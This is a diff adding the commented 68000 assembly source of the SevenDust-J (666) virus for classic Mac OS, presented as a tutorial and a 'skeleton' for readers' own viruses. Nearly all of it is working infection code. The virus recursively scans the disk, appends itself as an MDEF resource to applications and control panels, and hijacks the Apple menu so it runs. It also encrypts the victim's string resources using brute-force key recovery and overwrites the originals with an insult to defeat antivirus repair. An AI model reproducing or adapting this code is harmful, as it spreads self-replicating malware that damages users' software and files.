@@ -1,0 +1,699 @@
+;***************************************************************
+;BRUTE FORCE DECRYPTION ANALYSIS AND STATIC DIRECTORY INFECTION
+;IMPLEMENTED WITH THE VARIANT J OF THE 666 (a.k.a. SEVENDUST) VIRUS
+;***************************************************************
+;This variant of 666, which you all saw in the big tutorial download
+;with all my viruses from CodeBreakers, implements one final advancement
+;in the area of making hard for AVers to repair, namely, brute force
+;decryption. Brute Force decryption consists of not keeping the
+;encryption key anywhere in the infected file, rather, looking for it
+;at the time of execution. This technique is used for the first time
+;on the mac, and it will give you a basic idea of how to implement it,
+;so you can use it in your own viruses.
+;I have dropped all the advanced stuff, like metamorphism, oligomorphism
+;and encryption, and have kept only the idea of 'hard symbiotism'.
+;Hard Symbiotism is concerned more with non-repairability, and less
+;with encryption. Statistically speaking, the time AVers spend on trying
+;to repair the infected file, would be almost equivallent to trying to
+;detect the virus. So, this variant of 666 is much simpler than the
+;previous variants, and it can serve as a basic 'skeleton' for future
+;viruses. Although the most complex variants like the H/Ha/I/Ia are
+;really hard to follow, this one should give you a note of hope, and
+;maybe provide you with some interesting ideas on how to construct
+;variants on this skeleton easily. So, pick up a cup of coffee, light
+;up your smoke and read through...
+;***************************************************************
+;WARNING!! DO NOT TRY TO COMPILE THIS FILE!! IT HAS BEEN FORMATED
+;FOR READING. See below!
+;(To obtain the source/executable for this virus, download my entire
+;tutorial from www.CodeBreakers.org, under the section J.S.Bach.
+;And by the way, I don't have a clue why they named 666 "SevenDust".
+;If anybody knows what "SevenDust" means, please send me email at
+;"johannsebastian@hotmail.com" with an explanation. What is it? Some
+;sort of music or something????)
+;***************************************************************
+;The basic flowchart of the virus is simple:
+;1)Invoked MDEF executes on program startup.
+;2)Viral code brute force-decodes the symbiotic part of a 'STR#'
+;3)Viral code scans active disk directory, in search of apps to infect.
+;4)If an app is found, virus encodes 'STR#' of app (if there is one)
+;appends it to the virus body after encrypting it and then infects app.
+;Simple. Let's follow it in detail:
+;***************************************************************
+;WARNING!! THE AUTHOR IS NOT RESPONSIBLE FOR UNAUTHORIZED USE OF
+;THIS PROGRAM. IN PARTICULAR, THE AUTHOR IS NOT RESPONSIBLE IF
+;YOU TRY TO, OR RELEASE THE VIRUS. THE AUTHOR IS NOT RESPONSIBLE FROM
+;CRASHES OR MISBEHAVIOUR CAUSED BY THIS PROGRAM IN ANY OPERATING
+;SYSTEM. THIS PROGRAM IS PROVIDED AS A DEMONSTRATION VIRUS AND IS
+;NOT INTENDED TO BE INSTALLED ON MACHINES THAT YOU HAVE NO CONTROL
+;OVER. YOU HAVE BEEN WARNED: YOU ARE LIABLE TO PENALTIES
+;IF YOU RELEASE THIS VIRUS AND SPREAD IT IN EXECUTABLE FORM.
+;WARNING!! THIS VIRUS WILL INFECT ANY OS FROM 6.0.7 UP TO 8.0,
+;POSSIBLY 8.5 AS WELL. BE VERY CAREFULL WHEN YOU EXECUTE IT. IT
+;WILL GRADUALLY INFECT ALL THE APPS IN YOUR HARD DRIVE.
+;***************************************************************
+;SevenDust-J VIRUS, VERSION 1.0, WRITTEN IN 68000 ASM USING MPW 3.3.1.
+;YOU NEED MPW 3.3.1 OR HIGHER TO COMPILE THIS SOURCE.
+;WRITTEN AND COMPLETED ON 25/9/98  BY J.S.BACH.
+;***************************************************************
+                BLANKS    ON
+                STRING    ASIS
+;include files for asm
+                INCLUDE    'SysEqu.a'
+                INCLUDE    'SysErr.a'
+                INCLUDE    'ToolEqu.a'
+                INCLUDE    'Traps.a'
+
+                SEG    '666'    ;segment name
+;***************************************************************
+;System Variables
+;***************************************************************
+SystemMDEF        EQU        0
+CurResFile        EQU        SystemMDEF  + 4
+theMENUR          EQU        CurResFile  + 2
+Us                EQU        theMENUr    + 4
+FoundOne          EQU        Us          + 4
+AppRefNum         EQU        FoundOne    + 2
+ResId             EQU        AppRefNum   + 2
+HasInfected       EQU        ResId       + 2
+virSize           EQU        HasInfected + 2
+STRsize           EQU        virSize     + 4
+NewHandle         EQU        STRSize     + 4
+STRHandle         EQU        NewHandle   + 4
+Sample            EQU        STRHandle   + 4
+Scrambled         EQU        Sample      + 4
+ScramblerId       EQU        Scrambled   + 4
+RId               EQU        ScramblerId + 2
+RType             EQU        RId         + 2
+RName             EQU        RType       + 4
+STRRestored       EQU        RName       + 32
+temp              EQU        STRRestored + 2
+ProcID            EQU        6   ;offset into the 'MENU' resource handle
+FileType          EQU        32    ;offset to filetype into CInfoRec
+
+
+    MAIN
+Entry
+    MOVEM.L    A0-A4/D0-D7,-(SP)        ;save registers
+;***************************************************************
+;A4 always holds the address of our first var
+;***************************************************************
+    LEA        Vars,A4                ;get globals address
+    CLR.W      -(SP)                  ;room for refnum returned
+    _CurResFile                       ;return current resource file refnum
+    MOVE.W    (SP)+,CurResFile(A4)    ;put in storage
+;***************************************************************
+;then get the address of the system MDEF=0
+;***************************************************************
+    CLR.W    -(SP)                    ;refnum of system file (0)
+    _UseResFile                       ;use system res file
+    CLR.L    -(SP)                    ;room for handle to MDEF=0 resource
+    MOVE.L    #'MDEF',-(SP)           ;push MDEF restype
+    CLR.W    -(SP)                    ;push id=0
+    _Get1Resource                     ;get hold of it
+    MOVE.L    (SP)+,SystemMDEF(A4)    ;put in Storage
+    BNE.S    FindKey                  ;continue and decode it if non-nil
+    _Debugger                   ;crash if we can't get a system MDEF!!!
+;***************************************************************
+;Ok, 'FindKey' is the Brute-force decryptor. It will loop, trying
+;to find a key, with the criterion that a 'sample' stored there previously
+;must be matched with our code. This is how the key is found: A sample
+;of some bytes as they should be unencrypted, has been stored in our
+;file from a previous infection. The loop XORs a certain offset within the
+;file, until the sample and this offset match. THEN, our key is the value
+;of the loop counter. Let's see how:
+;***************************************************************
+FindKey
+    CMPI.W    #0,ScramblerId(A4)        ;do we have a scrambled resource id?
+;***************************************************************
+;if there is no scrambled id, it means that the previous infection
+;did not alter a 'STR#'resource.
+;***************************************************************
+    BEQ        InfectApp                ;no exit
+;***************************************************************
+;if the virus runs multiple times, it needs to know if the symbiotic
+;part has been decrypted successfully, so it does not waste time
+;decrypting again. This is what the next line checks for.
+;***************************************************************
+    TST.B    STRRestored(A4)          ;is our string descrambled?
+    BNE      InfectApp                ;decoded, goto infectApp
+;***************************************************************
+;And finally, the brute force decryptor. We start with a count of 0
+;***************************************************************
+    MOVEQ    #0,D1                    ;zero counter
+@1  ADDQ     #1,D1                    ;increment counter
+    MOVEQ    #0,D2                    ;zero
+    MOVEQ    #0,D3                    ;zero
+    MOVE.B   D1,D2                    ;copy in D2
+    MOVE.B   D2,D3                    ;copy in D3
+    ASL.L    #8,D2                    ;put in second byte
+    EOR.L    D2,D3                    ;Xor it
+    ASL.L    #8,D2                    ;put in second byte
+    EOR.L    D2,D3                    ;Xor it
+    ASL.L    #8,D2                    ;put in second byte
+    EOR.L    D2,D3                    ;Xor it
+;***************************************************************
+;ok, the shifts do the following: If our counter is $07 for example,
+;after all the ASL shifts and XORs have been performed, we have the
+;value $07070707 as a long in register D3.
+;***************************************************************
+    LEA        Entry,A0               ;load start
+    ADDA.L    virSize(A4),A0          ;goto start of STR# resource
+;***************************************************************
+;now we are pointing A0 to the end of the virus. Right AFTER the virus
+;body, but BEFORE the appended 'STR# resource, at the end of the virus.
+;Next we pick the longword found at this location and store it in the
+;variable Scrambled(A4). We then XOR this value with D3, and finally
+;bring in the actual 'sample' longwrord which we have stored in this
+;file from the previous infection. If the values match, then the value
+;of the counter is our decryption key. (CMP.L Scrambled(A4),D4=Sample(A4))
+;***************************************************************
+    MOVE.L   (A0),Scrambled(A4)      ;store scrambled data
+    EOR.L    D3,Scrambled(A4)        ;Xor with sample
+    MOVE.L   Sample(A4),D4           ;copy
+    CMP.L    Scrambled(A4),D4        ;are they the same?
+    BEQ.S    DeScramble              ;found key, decode
+    CMP      #255,D1                 ;are we done?
+    BLT.S    @1                      ;loop back
+;***************************************************************
+;descramble STR# resource. This subroutine descrambles the 'STR#'
+;resource which was encrypted and appended to the end of the virus body.
+;It is a simple do loop, with D0 going from 0 to STRSize-1. The
+;actual XOR operation is the instruction EOR.B (Exclusive Or.Byte)
+;***************************************************************
+DeScramble
+    MOVE.B    D1,D2                   ;key in D2
+    LEA       Entry,A0                ;get start
+    ADDA.L    virSize(A4),A0          ;point to STR# resource
+    MOVE.L    STRSize(A4),D1          ;size of STR# in D1
+    SUBQ      #1,D1                   ;size-1 in D1
+    MOVEQ     #0,D0                   ;zero in D0
+    BRA.S     @7                      ;branch into loop
+@8  ADDQ      #1,D0                   ;add one to D0
+@7  EOR.B     D2,(A0,D0)              ;Xor the byte
+    CMP.W     D0,D1                   ;end of virus yet?
+    BGT.S     @8                      ;no, loop back
+;***************************************************************
+;now restore STR# resource. Restoration is not simply a matter of
+;descrambling the resource. We must also restore the actual 'STR#'
+;resource in the resource file. We get hold of the scrambled 'STR#'
+;handle, we adjust its size to its actual size and shove the decrypted
+;code into it, thus repairing the resource. Finally, we mark a boolean
+;flag (STRRestored(A4)) that our resource has been repaired.
+;***************************************************************
+Restore
+    MOVE.W     CurResFile(A4),-(SP)    ;push us
+    _UseResFile                        ;use us
+    CLR.L      -(SP)                   ;room for handle
+    MOVE.L     #'STR#',-(SP)           ;push res type
+    MOVE.W     ScramblerId(A4),-(SP)   ;push id
+    _Get1Resource                      ;get it
+    MOVE.L     (SP)+,STRHandle(A4)     ;store
+    BEQ.S      InfectApp               ;if nil infect
+    MOVE.L     STRSize(A4),D0          ;new size
+    MOVE.L     STRHandle(A4),A0        ;handle again
+    _SetHandleSize                     ;set the original size
+    MOVEA.L    STRHandle(A4),A0        ;put in A0
+    _HLock
+    MOVEA.L    (A0),A1                 ;destination ptr
+    LEA        EndLabel,A0             ;source pointer
+    MOVE.L     STRSize(A4),D0          ;size
+    _BlockMove                         ;restore contents
+    MOVEA.L    STRHandle(A4),A0        ;get handle
+    _HUnlock                           ;unlock it, done
+    ST         STRRestored(A4)         ;ok, we restored it
+;***************************************************************
+;check directory and infect app. This subroutine dispatches to
+;scan the drive, in order to find other apps to infect. We look at
+;the flag (HasInfected(A4)) which flags infection only once, and
+;delve into ScanDrive, expecting to get a response boolean as
+;FoundOne(A4).
+;***************************************************************
+InfectApp
+    TST.B    HasInfected(A4)          ;test if loaded in memory
+    BNE      CallOldMDEF              ;yes, exit
+    CLR.B    FoundOne(A4)             ;clear flag
+    LEA      HParamBlock,A0           ;parameter block
+    CLR.L    ioNamePtr(A0)            ;nil ionameptr
+    _GetVol                           ;get default volume
+    BNE      CallOldMDEF              ;exit on error
+    MOVE.W   ioVRefNum(A0),-(SP)      ;push vrefnum
+    MOVE.L   #fsRtDirID,-(SP)         ;push start directory
+    BSR      ScanDrive                ;scan drive
+    TST.B    FoundOne(A4)             ;did we find one?
+    BEQ      CallOldMDEF              ;no, exit
+;***************************************************************
+;Here, we infect the application we found from the scan. First we
+;get a hold of ourselves as Us(A4), so we can duplicate the viral bod.
+;***************************************************************
+    CLR.L    NewHandle(A4)            ;clear new handle
+    MOVE.W   CurResFile(A4),-(SP)     ;activate ourselves as resource file
+    _UseResFile                       ;use us
+    CLR.L    -(SP)                    ;room for handle to us
+    MOVE.L   #'MDEF',-(SP)            ;push type
+    MOVE.W   #666,-(SP)               ;push id
+    _Get1Resource                     ;get it
+    MOVE.L   (SP)+,Us(A4)             ;store
+;***************************************************************
+;theSpec contains the spec of the application to be infected,
+;from ScanDrive. Here we open the file again for infection.
+;***************************************************************
+    CLR.W    -(SP)                    ;clear stack for file refnum
+    PEA      theSpec                  ;push theSpec
+    MOVE.B   #fsWrPerm,-(SP)          ;push write permission
+    _FSpOpenResFile                   ;open it
+    MOVE.W   (SP)+,D2                 ;pop resnum in D2
+    MOVE.W   ResErr,D0                ;check for error first
+    BNE      CallOldMDEF              ;exit on error
+    MOVE.W   D2,AppRefNum(A4)         ;application openned if no error
+;***************************************************************
+;the next 3 instructions calculate the size of the viral body.
+;***************************************************************
+    LEA      EndLabel,A0              ;load start
+    LEA      Entry,A1                 ;load end
+    SUBA.L   A1,A0                    ;find size of virus
+    MOVE.L   A0,virSize(A4)           ;store there
+;***************************************************************
+;now get hold of a STR# resource and figure its size
+;***************************************************************
+    CLR.L    -(SP)                    ;room for STR# resource
+    MOVE.L   #'STR#',-(SP)            ;push resource type
+    MOVE.W   #1,-(SP)                 ;push index=1
+    _Get1IxResource                   ;get first avail STR# resource
+    MOVE.L   (SP)+,STRHandle(A4)      ;get handle
+;***************************************************************
+;if the handle we got is nil, it means that the application does not
+;have any 'STR#' resources, so we jump directly to appending infection.
+;if it is non-nil, however, we goto finding info about the resource.
+;***************************************************************
+    BNE.S    GetInfo                   ;if non-zero, get Info
+    CLR.L    STRSize(A4)               ;clear size
+    CLR.W    ScramblerId(A4)           ;clear so we know afterwards
+    BRA.S    New                       ;goto newHandle
+GetInfo
+    MOVE.L   STRHandle(A4),-(SP)      ;push handle again
+    PEA      RId(A4)                  ;push address to store id
+    PEA      RType(A4)                ;push address to store type
+    PEA      RName(A4)                ;push address for name
+    _GetResInfo                       ;get information
+    MOVE.W   ResErr,D0                ;get error, but ignore
+    BNE      CallOldMDEF              ;error, exit
+    CLR.L    -(SP)                    ;room for size handle
+    MOVE.L   STRHandle(A4),-(SP)      ;push handle
+    _SizeRsrc                         ;get size of 'STR#' resource
+    MOVE.L   (SP)+,STRSize(A4)        ;put size in var
+;***************************************************************
+;The following allocates a new handle for the virus, regardless
+;of whether we have a symbiot 'STR#' resource that will be appended.
+;***************************************************************
+New
+    MOVE.L   virSize(A4),D0            ;put size in D0
+    ADD.L    STRSize(A4),D0            ;add size of STR# (=0 if no STR#)
+    _NewHandle                         ;allocate
+    MOVE.L   A0,NewHandle(A4)          ;copy handle
+    BEQ      CallOldMDEF               ;if nil exit, we failed to duplicate
+;***************************************************************
+;now we copy the virus into the new handle we got.
+;***************************************************************
+    MOVE.L    NewHandle(A4),A0         ;get handle
+    _HLock                             ;lock handle
+    MOVE.L    Us(A4),A0                ;get us
+    _HLock                             ;lock
+    MOVE.L    Us(A4),A0                ;get again
+    MOVEA.L    (A0),A0                 ;dereference for source
+    MOVE.L    NewHandle(A4),A1         ;get copy
+    MOVE.L    (A1),A1                  ;dereference for destination
+    MOVE.L    virSize(A4),D0           ;number of bytes to copy
+    _BlockMove                         ;copy
+    MOVE.L    Us(A4),A0                ;get handle
+    _HUnlock                           ;unlock
+;***************************************************************
+;The new handle copy equals in size both the virus body, plus the
+;size of a (possible) 'STR# resource. So we copy the 'STR#' into
+;the end of the new handle. Not that if STRSize=0, we ignore the
+;transfer of bytes.
+;***************************************************************
+    CMPI.L    #0,STRSize(A4)            ;check size
+    BEQ       AddRes                    ;if no STR# resource (size=0) exit
+    MOVE.L    STRHandle(A4),A0          ;get handle
+    _HLock                              ;lock it
+    MOVE.L    STRHandle(A4),A0          ;get again
+    MOVEA.L   (A0),A0                   ;get source
+    MOVE.L    NewHandle(A4),A1          ;get new handle
+    MOVEA.L   (A1),A1                   ;deref
+    ADDA.L    virSize(A4),A1            ;get destination
+    MOVE.L    STRSize(A4),D0            ;bytes to copy
+    _BlockMove                          ;copy STR#
+    MOVE.L    STRHandle(A4),A0          ;get handle
+    _HUnlock                            ;unlock it
+;***************************************************************
+;store STR# id in new handle. We do this as follows: We calculate
+;the offset of the variable 'ScrambleId' from the start of the vir,
+;and then shove the value of the actual resource id into the new handle
+;at an offset exactly equal to the offset we found. (Start=A0, Offset=D0)
+;***************************************************************
+    LEA       ScramblerId(A4),A0        ;location of scramblerId
+    LEA       Entry,A1                  ;start of vir
+    SUBA.L    A1,A0                     ;find offset
+    MOVE.L    A0,D0                     ;copy in D0
+    MOVE.L    NewHandle(A4),A0          ;get handle
+    MOVEA.L   (A0),A0                   ;deref
+    MOVE.W    RId(A4),(A0,D0)           ;stuff id there
+;***************************************************************
+;now we encrypt the STR# inside the MDEF, so as to make it hard
+;for AVers to correct the symbiot.!! This is again a simple do loop,
+;with D0 varying from 0 to STRSize-1. We cycle in there and XOR every
+;byte of the 'STR#' resource. Notice how we pick a 'sample' to have
+;handy for our next infection. The sample is simply a longword at
+;offset 'VirSize'. (Actually this longword would be the first long
+;inside the 'STR#' resource. Namely, the number of strings (=2 bytes)
+;and the first two bytes from the first string in the resource).
+;***************************************************************
+Encrypt
+    MOVE.L    NewHandle(A4),A0          ;load virus
+    MOVEA.L   (A0),A0                   ;get data
+    ADDA.L    virSize(A4),A0            ;goto start of STR# resource
+    MOVE.L    (A0),Sample(A4)           ;get a sample
+    MOVE.L    Time,D0                   ;get a random long
+    ANDI.L    #$000000FF,D0             ;only last byte couts
+    CMPI.B    #0,D0                     ;is key zero?
+    BEQ.S     Encrypt                   ;try again if zero
+    MOVE.B    D0,D2                     ;key in D2
+    MOVE.L    NewHandle(A4),A0          ;new handle
+    MOVE.L    (A0),A0                   ;get data
+    ADDA.L    virSize(A4),A0            ;point to STR# resource
+    MOVE.L    STRSize(A4),D1            ;size of STR# in D1
+    SUBQ      #1,D1                     ;size-1 in D1
+    MOVEQ     #0,D0                     ;zero in D0
+    BRA.S     @7                        ;branch into loop
+@8  ADDQ      #1,D0                     ;add one to D0
+@7  EOR.B     D2,(A0,D0)                ;Xor the byte
+    CMP.W     D0,D1                     ;end of virus yet?
+    BGT.S     @8                        ;no, loop back
+;***************************************************************
+;put sample so we can decode later! Here we stuff the sample in
+;the new handle copy, at the proper location offset, so we can
+;use it on the next decryption.
+;***************************************************************
+    LEA       Sample(A4),A0            ;location of sample
+    LEA       Entry,A1                 ;start of vir
+    SUBA.L    A1,A0                    ;find offset
+    MOVE.L    A0,D0                    ;copy in D0
+    MOVE.L    NewHandle(A4),A0         ;get handle
+    MOVEA.L   (A0),A0                  ;deref
+    MOVE.L    Sample(A4),(A0,D0)       ;stuff sample there
+;***************************************************************
+;cancel hasinfected so we can infect when virus runs in next generation.
+;HasInfected has been set to true, (see below) since we have ran at least
+;once through the code. But the new copy doesn't know this, so we must
+;restore the value to its original state.
+;***************************************************************
+    LEA       HasInfected(A4),A0       ;location of HasInfected
+    LEA       Entry,A1                 ;start of vir
+    SUBA.L    A1,A0                    ;find offset
+    MOVE.L    A0,D0                    ;copy in D0
+    MOVE.L    NewHandle(A4),A0         ;get handle
+    MOVEA.L   (A0),A0                  ;deref
+    CLR.B     (A0,D0)                  ;has infected clear
+;***************************************************************
+;cancel STRRestored so we can restore our string. Same for
+;STRRestored. The new copy of the virus, must assume that it has not
+;descrambled the 'STR#' resource. Similar technique. Just figuring
+;the offset of the corresponding var, then stuffing in the new copy.
+;***************************************************************
+    LEA       STRRestored(A4),A0       ;location of STRRestored
+    LEA       Entry,A1                 ;start of vir
+    SUBA.L    A1,A0                    ;find offset
+    MOVE.L    A0,D0                    ;copy in D0
+    MOVE.L    NewHandle(A4),A0         ;get handle
+    MOVEA.L   (A0),A0                  ;deref
+    CLR.B     (A0,D0)                  ;has infected clear
+;***************************************************************
+;destroy old STR# resource!! Finally, mangle the original 'STR#'
+;resource. For the mangling, we use the sample string:
+;"You are a big stupid jerk!". So if a user removes the virus,
+;all alerts, ballon help, or messages pertaining to this resource
+;will show this message instead. For the resizing, we do the following
+;calculation: We count the number of strings in the 'STR#' resource,
+;(usually found at the word at offset 0 in the beginning of the resource)
+;and multiply by the length of the string "You are a big stupid jerk".
+;So first we resize, and then we shove the new strings into the resource.
+;The offset to correctly BlockMove, is A1+$2+D3=index*26, where index is the
+;number of the string in the resource. (2(A1,D3)). 2 is for the word
+;that tells how many strings are there in the 'STR#' resource.
+;***************************************************************
+    MOVEQ    #0,D1                   ;zero D1
+    MOVE.L   STRHandle(A4),A0        ;get master pointer
+    _HLock                           ;lock handle
+    MOVE.L   STRHandle(A4),A0        ;get handle again
+    MOVEA.L  (A0),A0                 ;get data
+    MOVE.W   (A0),D1                 ;string count in D1
+    MOVE.W   D1,D2                   ;copy in D2 string count
+    SUBQ     #1,D2                   ;count-1 in D2
+    MULU     #26,D1                  ;multiply by string length
+    ADDQ     #2,D1                   ;length byte of STR# resource
+    MOVE.L   STRHandle(A4),A0        ;get handle
+    _HUnlock                         ;unlock it
+    MOVE.L   STRHandle(A4),A0        ;get handle again
+    MOVE.L   D1,D0                   ;new size in D0
+    _SetHandleSize                   ;resize it
+    MOVE.W   MemErr,D0               ;get error
+    BNE      CallOldMDEF             ;exit if we fail to resize
+    MOVE.L   STRHandle(A4),A0        ;get it again
+    _HLock                           ;lock it
+    MOVEQ    #-1,D1                  ;zero D0
+    MOVEQ    #0,D3                   ;zero D3
+@1  ADDQ     #1,D1                   ;add one
+    MOVE.W   D1,D3                   ;copy
+    MULU     #26,D3                  ;multiply by 26
+    LEA      MDEFName,A0             ;get address of good string=source
+    MOVE.L   STRHandle(A4),A1        ;get dest handle
+    MOVEA.L  (A1),A1                 ;get destination handle
+    LEA      2(A1,D3),A1             ;get correct destination address
+    MOVE.L   #26,D0                  ;size=26 bytes
+    _BlockMove
+    CMP.W    D1,D2                   ;are we done?
+    BGT.S    @1                      ;if not, move back
+    MOVE.L   STRHandle(A4),A0        ;get handle
+    _HUnlock
+    MOVE.L   STRHandle(A4),-(SP)     ;push MENU resource
+    _ChangedResource                 ;change it to bogus data
+;***************************************************************
+;And finally, add the new MDEF resource in the new file to be infected!!
+;***************************************************************
+AddRes
+    MOVE.L    NewHandle(A4),A0       ;get handle
+    _HUnlock                         ;unlock
+    MOVE.L    NewHandle(A4),-(SP)    ;push newhandle
+    MOVE.L    #'MDEF',-(SP)          ;pushres type
+    MOVE.W    #666,-(SP)             ;push id
+    PEA       MDEFName               ;push name
+    _AddResource                     ;add it
+    MOVE.W    ResErr,D0              ;get error
+    BNE.S     CloseAgain             ;close resfile
+;***************************************************************
+;we must also alter the MDEF id of the apple menu so it calls our
+;MDEF. We change the MDEF id from 0 to 666.
+;***************************************************************
+    CLR.L    -(SP)                    ;room for menu handle
+    MOVE.L   #'MENU',-(SP)            ;push type
+    MOVE.W   ResId(A4),-(SP)          ;push id
+    _Get1Resource                     ;get it
+    MOVE.L   (SP)+,theMENUr(A4)       ;store
+    MOVEA.L  theMENUr(A4),A0          ;put in A0
+    _HLock                            ;lock it
+    MOVE.L   (A0),A0                  ;get data
+    MOVE.W   #666,ProcId(A0)          ;stuff proc id
+    MOVE.L   theMENUr(A4),A0          ;put in A0 again
+    _HUnlock
+    MOVE.L   theMENUr(A4),-(SP)       ;push handle
+    _ChangedResource                  ;mark permanent
+CloseAgain
+    BSR.S    Dispose                  ;dispose new handle
+    MOVE.W   AppRefNum(A4),-(SP)      ;push foreign app
+    _CloseResFile                     ;close res file
+    ST       HasInfected(A4)          ;set mem flag
+    BRA      CallOldMDEF              ;exit normally
+;***************************************************************
+;test if we need to dispose. We need to check if our handle was
+;added successfully with AddResource. If yes, we leave the handle alone.
+;If yes, we dispose manually.
+;***************************************************************
+Dispose
+    TST.L    NewHandle(A4)            ;is our handle nil?
+    BEQ.S    DontDispose              ;if yes, don't dispose anything
+    MOVEQ    #0,D0                    ;clear D0
+    MOVE.L   NewHandle(A4),A0         ;handle in A0
+    _HGetState                        ;get the state of the handle
+    BTST     #5,D0                    ;test the resource bit
+    BNE.S    DontDispose              ;if set, exit
+    MOVE.L   NewHandle(A4),A0         ;put in A0
+    _DisposeHandle                    ;dispose handle if addresource failed
+DontDispose
+    RTS
+;***************************************************************
+;classic directory scan. Subroutine is recursive. Similar to the
+;'EraseDrive' subroutine in previous versions of SevenDust. The
+;subroutine simply enumerates all the objects on the startup disk
+;and if the object is a directory, (BTST #4,D0) then we go into this
+;directory and continue there. Note that since we are recursive,
+;we need LINK/UNLK instructions, to reference our parameters on
+;the stack correctly.
+;***************************************************************
+ScanDrive
+    LINK    A6,#0                    ;no locals
+    MOVE.L  D1,-(SP)                 ;save D1
+    MOVEQ   #0,D1                    ;start counter
+AddOne
+    ADDQ    #1,D1                    ;add 1 to counter
+    LEA     CInfoPB,A0               ;load address of our record
+    CLR.L   ioCompletion(A0)         ;nil
+    LEA     theName,A1               ;name address
+    MOVE.L  A1,ioNamePtr(A0)         ;name address
+    MOVE.W  12(A6),ioVRefNum(A0)     ;vrefnum we want
+    MOVE.L  8(A6),ioDirId(A0)        ;dirid
+    MOVE.W  D1,ioFDirIndex(A0)       ;index into directory
+    _GetCatInfo                      ;get directory info
+    CMP.W   #fnfErr,D0               ;see if end of directory
+    BEQ.S   ExitScan                 ;exit scanning if done
+    MOVE.B  ioFLAttrib(A0),D0        ;get file attributes
+    BTST    #4,D0                    ;is it a directory?
+    BNE.S   Stack                    ;yes, go down recursivelly
+    BSR.S   CheckFile                ;else, check file
+    BRA.S   Test                     ;go check found
+Stack
+    MOVE.W  12(A6),-(SP)             ;push vrefnum
+    MOVE.L  ioDrDirId(A0),-(SP)      ;push directory
+    JSR     ScanDrive                ;call recursivelly
+Test
+    TST.B   FoundOne(A4)             ;have we found one?
+    BNE.S   ExitScan                 ;yes, exit scanning
+    BRA.S   AddOne                   ;continue with rest of directories
+ExitScan
+    MOVE.L  (SP)+,D1                 ;restore D1
+    UNLK    A6                       ;unlink
+    MOVEA.L (SP)+,A0                 ;pop return address
+    ADDQ    #6,SP                    ;pop arguments
+    JMP     (A0)                     ;return recursivelly
+;***************************************************************
+;Check file simply checks the kind of file. If it is the kinds
+;listed below, it can be infected safely.
+;***************************************************************
+CheckFile
+    MOVEM.L  D0-D7,-(SP)             ;save registers
+    CMP.L    #'APPL',FileType(A0)    ;check file type
+    BEQ.S    MakeSpec                ;applications can be infected
+    CMP.L    #'cdev',FileType(A0)    ;check file type
+    BEQ.S    MakeSpec                ;control panels can be infected
+    CMP.L    #'APPC',FileType(A0)    ;check file type
+    BNE      ExitCheck               ;if nothing above, exit
+;***************************************************************
+;MakeSPec creates an FSSpec file specification for our file, to be
+;later handly when we add our viral resources.
+;***************************************************************
+MakeSpec
+    CLR.W    -(SP)                    ;room for error from FSMakeFSSpec
+    MOVE.W   ioVRefNum(A0),-(SP)      ;push VRefNum
+    MOVE.L   ioFLParId(A0),-(SP)      ;push DirId
+    PEA      theName                  ;push name
+    PEA      theSpec                  ;push address of theSpec
+    _FSMakeFSSpec                     ;make file Spec
+    MOVE.W   (SP)+,D0                 ;copy error but ignore
+    BNE      ExitCheck                ;exit on error
+;***************************************************************
+;now open application
+;***************************************************************
+    CLR.W    AppRefNum(A4)            ;clear refnum
+    CLR.W    -(SP)                    ;clear stack for file refnum
+    PEA      theSpec                  ;push theSpec
+    MOVE.B   #fsWrPerm,-(SP)          ;push write permission
+    _FSpOpenResFile                   ;open it
+    MOVE.W   (SP)+,D2                 ;pop resnum in D1
+    MOVE.W   ResErr,D0                ;check for error
+    BNE      ExitCheck                ;error, exit
+;***************************************************************
+;see if application is infected first. If it contains a MDEF=666,
+;it is infected.
+;***************************************************************
+    MOVE.W    D2,AppRefNum(A4)        ;store app refnum
+    CLR.L     -(SP)                   ;room for MDEF
+    MOVE.L    #'MDEF',-(SP)           ;push restype
+    MOVE.W    #666,-(SP)              ;push id
+    _Get1Resource                     ;get it
+    TST.L     (SP)+                   ;test handle
+    BNE.S     CloseApp                ;infected, exit
+;***************************************************************
+;now see if application has any MENUs, and pick the Apple Menu
+;by force, by looping through all the menus, until we find the
+;Apple menu (CMP.W #$0114,D7) (Length=$01, Apple Symbol=$14)
+;***************************************************************
+    CLR.W    -(SP)                    ;room for count
+    MOVE.L   #'MENU',-(SP)            ;type
+    _Count1Resources                  ;count them
+    MOVE.W   (SP)+,D3                 ;get count
+    BEQ.S    CloseApp                 ;exit if 0 MENUs
+    MOVEQ    #0,D4                    ;init counter
+@1    ADDQ   #1,D4                    ;add one
+    CLR.L    -(SP)                    ;room for MENU handle
+    MOVE.L   #'MENU',-(SP)            ;push res type
+    MOVE.W   D4,-(SP)                 ;push index
+    _Get1IxResource                   ;get index resource
+    MOVE.L   (SP)+,theMENUr(A4)       ;get menu
+    MOVEA.L  theMENUr(A4),A0          ;into A0
+    _HLock
+    MOVE.L   theMENUr(A4),A0          ;get it again
+    MOVEA.L  (A0),A0                  ;get data
+    MOVE.W   ProcId(A0),D5            ;get proc id
+    MOVE.W   (A0),D6                  ;remember res id
+    MOVE.W   $E(A0),D7                ;remember string of menu title
+    MOVE.L   theMENUr(A4),A0          ;put in A0 again
+    _HUnlock
+    CMP.W    #0,D5                    ;is procid=0??
+    BNE.S    @2                       ;ignore if <>0
+    CMP.W    #$0114,D7                ;check if it is the Apple Menu
+    BNE.S    @2                       ;ignore if not apple menu
+    ST       FoundOne(A4)             ;set flag
+    MOVE.W   D6,ResId(A4)             ;remember id of menu
+    BRA.S    CloseApp                 ;found it, go close
+@2  CMP.W    D4,D3                    ;are we done?
+    BGT.S    @1                       ;no, go back
+CloseApp
+    TST.W    AppRefNum(A4)            ;test refnum
+    BEQ.S    ExitCheck                ;if zero, exit
+    MOVE.W   AppRefNum(A4),D2         ;put in d2
+    CMP.W    CurResFile(A4),D2        ;test against ours
+    BEQ.S    ExitCheck                ;exit of ours
+    MOVE.W   AppRefNum(A4),-(SP)      ;push refnum
+    _CloseResFile                     ;close it
+ExitCheck
+    MOVEM.L  (SP)+,D0-D7              ;restore registers
+    RTS
+;***************************************************************
+;the following is the branch to the system MDEF code after we are
+;done. We directly jump to the MDEF address we got at the beginning
+;of the virus. This address, is stored at offset 0 from A4.
+;IMPORTANT!! Look at how we restore always the current resource file!
+;***************************************************************
+CallOldMDEF
+    MOVE.W    CurResFile(A4),-(SP)    ;push id of current resfile
+    _UseResFile                       ;use old resfile
+    MOVEM.L   (SP)+,A0-A4/D0-D7       ;restore registers
+    MOVEA.L   Vars,A0                 ;fetch label of vars
+    MOVEA.L   (A0),A0                 ;dereference and get address of
+SysMDEF
+    JMP        (A0)                   ;jump to old MDEF code
+Vars
